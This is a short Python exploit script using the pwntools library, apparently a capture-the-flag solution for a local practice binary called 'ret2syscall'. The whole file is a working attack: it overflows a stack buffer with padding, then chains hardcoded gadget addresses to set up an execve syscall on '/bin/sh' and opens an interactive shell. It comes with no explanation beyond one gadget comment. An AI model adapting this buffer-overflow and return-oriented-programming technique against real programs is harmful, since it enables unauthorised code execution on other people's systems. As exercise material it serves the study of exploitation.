#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ret2syscall')
elf = ELF('./ret2syscall')

prax_rdx_ret = 0x481d26 #pop rax ; pop rdx ; pop rbx ; ret
prdi_ret = 0x4006a6
prsi_ret = 0x40ffd3
syscall = 0x474e15
binsh = 0x4925c4

payload  = 'A'*0x70 + p64(0)
payload += p64(prax_rdx_ret) + p64(0x3b) + p64(0)*2
payload += p64(prsi_ret) + p64(0)
payload += p64(prdi_ret) + p64(binsh)
payload += p64(syscall)

p.recvuntil("Please pwn me :)\n")
p.sendline(payload)
p.interactive()
